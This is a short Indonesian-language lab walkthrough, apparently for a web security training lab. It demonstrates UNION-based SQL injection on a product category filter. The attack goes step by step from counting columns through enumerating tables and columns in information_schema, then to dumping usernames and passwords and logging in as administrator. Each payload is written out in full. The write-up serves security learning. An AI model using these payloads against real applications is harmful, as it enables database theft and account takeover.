# SQL injection attack, listing the database contents on non-Oracle databases

<figure><img src="../../../.gitbook/assets/gambar (6).png" alt=""><figcaption></figcaption></figure>

di lab ini tujuan akhirnya adalah kita login sebagai administrator. tapi sebelum itu  kita harus mengambil kredensial yang ada di database melalui celah UNION bases SQL Injection.

langkah pertama, identifikasi titik yang dapat di eksploitasi. dalam hal ini ada di parameter bagian kategori: `filter?category=Pets` .

di bagian akhir URL, tambahkan payload untuk menentukan jumlah kolom.

`category=Pets'+UNION+SELECT+'asd','qwe'+--+` dengan payload ini kita mendapatkan respon halaman normal, artinya jumlah kolom ada 2.

sekarang kita perlu tahu tabel apa saja yang ada di database, untuk itu buat payload seperti berikut:

`category=Pet'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--+`&#x20;

payload di atas akan menampilkan seluruh nama tabel yang ada di database. cari tabel yang berisi kredensial pengguna, seperti user, users, dll.

<figure><img src="../../../.gitbook/assets/gambar (1).png" alt=""><figcaption></figcaption></figure>

setelah tahu nama tabelnya, kita harus tahu juga nama kolom yang ada di tabel itu. buat payload seperti berikut:

`category=Pet'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_yicmid'--+` ini akan menampilkan nama kolom untuk tabel `users_yicmid`. (dalam pengerjaan lab, nama tabel mungkin saja berbeda, intinya adalah tabel yang berkaitan dengan users)

<figure><img src="../../../.gitbook/assets/gambar (2).png" alt=""><figcaption></figcaption></figure>

langkah terakhir, baca isi kolom menggunakan payload berikut:

`Pet'+UNION+SELECT+username_pkppkf,password_miwula+FROM+users_yicmid--+`&#x20;

<figure><img src="../../../.gitbook/assets/gambar (3).png" alt=""><figcaption></figcaption></figure>

setelah mendapatkan kredensial, gunakan akun administrator untuk login.

<figure><img src="../../../.gitbook/assets/gambar (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/gambar (5).png" alt=""><figcaption><p>solved!</p></figcaption></figure>
